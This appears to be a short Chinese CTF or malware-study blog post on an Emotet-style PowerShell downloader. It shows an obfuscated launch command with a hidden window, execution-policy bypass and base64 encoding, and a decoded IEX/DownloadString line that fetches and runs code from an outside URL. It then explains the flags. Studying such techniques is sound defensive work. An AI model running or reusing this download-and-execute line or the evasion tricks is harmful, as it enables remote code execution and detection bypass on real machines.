---
title: Powershell脚本
date: 2023-08-29 15:19:49
categories: CTF
tags: [virus]
---
## Emptet下载器

技术特点：利用大小写，空格加base64绕过特征检测。

```shell
cmd /c powErshEll -nop -w hiddEn -Ep bypass -Enc {base64_encoded_string}
```

```
I E X   ( N e w - O b j e c t   N e t . W e b c l i e n t ) . d o w n l o a d s t r i n g ( " h t t p : / / e d u c a t i o l i n k . c o m / i n d e x . p h p " ) 
```

 基础知识：

 `-nop`：这是 `-NoProfile` 的简写，启动 PowerShell 时不加载用户的个人档案。 

 -w hiddEn 用于指定 PowerShell 窗口的显示样式。 

 `bypass` 设置表示没有任何限制：脚本可以运行，配置文件可以加载。 